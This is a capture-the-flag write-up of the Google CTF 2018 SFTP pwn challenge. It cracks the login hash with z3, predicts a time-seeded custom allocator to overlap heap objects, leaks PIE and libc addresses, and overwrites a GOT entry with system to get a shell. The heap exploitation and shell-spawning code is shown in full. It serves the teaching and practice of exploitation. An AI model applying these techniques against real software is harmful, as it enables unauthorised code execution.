---
title: SFTP - Google CTF 2018
layout: post
date: '2018-06-26 19:28:37'
---

> This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques...
> 
> nc sftp.ctfcompetition.com 1337
>
> [Attachment](/assets/google18/sftp)


*181 points, 60 Solves, pwn*


After running the binary we are shown what looks like a standard ssh login:

```bash
$ ./sftp
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)?
```

But a quick look at the disassembly shows that it is just a printing out a string, then reading a password of up to 15 characters.

![disassembly](/assets/google18/bn1.jpg)

The password check looks like a fairly simple hash, so I decided to write a quick script to solve it using [z3-solver](https://pypi.org/project/z3-solver/)

![hash assembly](/assets/google18/hash.jpg)

We start of with `0x5417` and `xor` with a character of the password, then double the result. This is repeated for each letter and if the final hash is `0x8dfa` then the password is valid. As the hash a word (16 bits), before xoring we need to sign extend the chararacters. I also restriced the letters to be within the printable ascii range.

```python
from z3 import *

s = Solver()
password = []
length = 15
for i in range(length):
  password.append(BitVec('chr{}'.format(i), 8))
  s.add([UGT(password[i], 0x20), ULT(password[i], 0x80)])

code = BitVecVal(0, 16)
code += 0x5417

for i in range(0, length):
  code = code ^ SignExt(8, password[i])
  code = code * 2

s.add(code == 0x8DFA)

if s.check() != unsat:
  model = s.model()
  buf = ""
  for i in range(0, length):
    obj = password[i]
    c = model[obj].as_long()
    buf += chr(c)
  print buf
```

This spits out `!"$,==<==-(@0@]` which lets us in!
```
c01db33f@sftp.google.ctf's password: !"$,==<==-(@0@]
Connected to sftp.google.ctf.
sftp> help
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
get remote                         Download file
ls [path]                          Display remote directory listing
mkdir path                         Create remote directory
put local                          Upload file
pwd                                Display remote working directory
quit                               Quit sftp
rm path                            Delete remote file
rmdir path                         Remove remote directory
symlink oldpath newpath            Symlink remote file
```

So we have a basic file server with a bunch of operations, and poking around there is a fake flag, as well as the `sftp.c` which is the [source for the program!](/assets/google18/sftp.c). The challenge description states that they have used *a sophisticated malloc implementation*, so lets investigate what that might be.

![malloc](/assets/google18/malloc.jpg)
![realloc](/assets/google18/realloc.jpg)
![free](/assets/google18/free.jpg)

Soooooo...not that secure 😀 Since `rand` is seeded with `srand(time(0))` (only second precision) we can easily predict every address that malloc will generate. As we can malloc as many times as we need and of sizes up to 65535 bytes (file_max) we should easily be able to find something to overlap.

The file system is stored in a tree like data structure using the following structs:
```c
struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};

struct directory_entry {
  struct entry entry;

  size_t child_count;
  struct entry* child[];
};

struct file_entry {
  struct entry entry;

  size_t size;
  char* data;
};

struct link_entry {
  struct entry entry;

  struct entry* target;
};
```

Using the `put` command we can either create a new file or update an existing one, so we can use a `file_entry` as our target to overwrite. Each `file_entry` will call malloc twice, once for the entry struct and once for the content. Initially malloc is called 6 times to set up the existing files and directories, so after we call `srand(time(0))` and then `rand` 6 times we can start generating addressing trying to find two that overlap.

We can do this all in python using `CDLL` to call libc functions, also keep track of the mallocs and whether they are potintially overlap.

```python
from ctypes import CDLL

c = CDLL("libc-2.23.so")
t = c.time(0)
c.srand(t)

allocated = []
overlapping = []

def rand(label):
  loc = c.rand() & 0x1FFFFFFF | 0x40000000;

  allocated.append((loc, label))
  overlapping.append(int((loc-0x40000000)/65535))

  return loc
```

The great thing about this is that we can do it even without sending anything to the server. I wrote a quick and dirty function that would find the index content malloc followed by an entry malloc.

```python
def check():
  i = 0
  seen = {}
  for m in overlapping:
    if m not in seen:
      seen[m] = i
    elif allocated[i][1] == "content" and allocated[seen[m]][1] == "entry":
      return (i, seen[m])
    elif allocated[i][1] == "entry" and allocated[seen[m]][1] == "content":
      return (seen[m], i)
    i += 1
  return None

while not check():
  rand("entry")
  rand("content")

content, entry = check()

if allocated[content][0] > allocated[entry][0]:
  print "err content after entry"
  return

print "content {}: 0x{:x} - {}".format(content, allocated[content][0], allocated[content][1])
print "entry {}: 0x{:x} - {}".format(entry, allocated[entry][0], allocated[entry][1])

```

So now we have the heap address (and the index when they will be created) for an entry and content, and can caculate the distance between them so we know exactly how far to overflow.

```bash
dist 0x5691
168 entry 0x413274e6
43 content 0x41321e55
```

We then check which entry comes first and create the corresponsing entry struct to overwrite, and the content that will overwrite it, making sure to use the full filesize for the content so that malloc isn't called again when we update it.

```python
entryNum = (entry - 6)/2
contentNum = (content - 6)/2

overwriteSize = dist + 48

if contentNum < entryNum:
  for i in range(contentNum):
    put("padding", "padding" + str(i))
    rm("padding")

  put("content", "A" * overwriteSize)

  for i in range(contentNum + 1, entryNum):
    put("padding", "padding")
    rm("padding")

  put("entry", "overwrite")

else:
  for i in range(entryNum):
    put("padding", "padding")
    rm("padding")

  put("entry", "overwrite")

  for i in range(entryNum + 1, contentNum):
    put("padding", "padding" + str(i))
    rm("padding")
  
  put("content", "A" * overwriteSize)
```

We can now overwrite the file entry with what ever we want, so we can create some helper functions for a read/write primative. Here `root` is the heap address of the root folder to set as the parent directory, this will just be the first entry in our list of malloced addresses.

```python
def set_addr(addr, dist, root):
  payload = p64(root)                   # parent dir
  payload += p32(2)                     # type
  payload += "entry".ljust(20, "\x00")  # name
  payload += p64(8)                     # size
  payload += p64(addr)                  # data

  put("content", "B" * dist + payload)


def leak(addr, dist, root):
  set_addr(addr, dist, root)
  data = get("entry")
  
  return u64(data.ljust(8, "\x00"))

def write(addr, value, dist, root):
  set_addr(addr, dist, root)
  put("entry", p64(value))
```

Now it's just a matter of leaking eough to defeat pie and aslr so that we can overwrite a GOT entry, luckily they were using the same libc as me but otherwise it could have been looked up [somewhere like this](https://libc.blukat.me/?q=fgets%3A0x7fc32f918ad0%2Cputs%3A0x7fc32f91a690)

```python
print "leaking root folder: 0x{:x}".format(allocated[0][0])
pie_leak = leak(allocated[0][0], dist, allocated[0][0])
log.info("pie_leak: 0x{:x}".format(pie_leak))

binary.address = pie - 0x208be0
log.info("pie: 0x{:x}".format(binary.address))

puts = leak(binary.got["puts"], dist, allocated[0][0])
log.info("puts: 0x{:x}".format(puts))

fgets = leak(binary.got["fgets"], dist, allocated[0][0])
log.info("fgets: 0x{:x}".format(fgets))
libc.address = fgets - libc.symbols["fgets"]

write(binary.got["__isoc99_sscanf"], libc.symbols["system"], dist, allocated[0][0])

p.sendlineafter("sftp>", "ls; bash")
p.interactive()
```

Then finally we get a shell and the flag!

```bash
$ cd /home/user
$ cat flag
CTF{Moar_Randomz_Moar_Mitigatez!}
```


[Full exploit here](https://github.com/vakzz/ctfs/blob/master/Google2018/sftp/solv.py)
